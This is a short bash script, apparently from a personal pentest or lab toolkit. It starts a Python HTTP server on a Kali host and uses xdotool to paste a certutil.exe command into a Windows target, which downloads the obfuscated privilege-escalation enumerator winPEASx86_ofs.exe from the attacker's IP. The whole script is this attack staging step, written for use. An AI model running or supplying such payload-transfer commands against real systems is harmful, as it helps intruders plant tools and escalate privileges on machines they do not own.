#!/bin/bash

: '
cmd: upload winPEASx86_ofs.exe file to server
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Http port"

HTTP_PORT=${form_data["Http port"]}

cd ~/Desktop/base/code/xdotool/scripts/fileTransfer/windows/.binaries
python3 -m http.server ${HTTP_PORT} &
HTTP_PID=$!

paste_command "certutil.exe -urlcache -split -f http://${KALI_IP}:${HTTP_PORT}/winPEASx86_ofs.exe winPEASx86_ofs.exe"
xdotool key Return
sleep 60

kill $HTTP_PID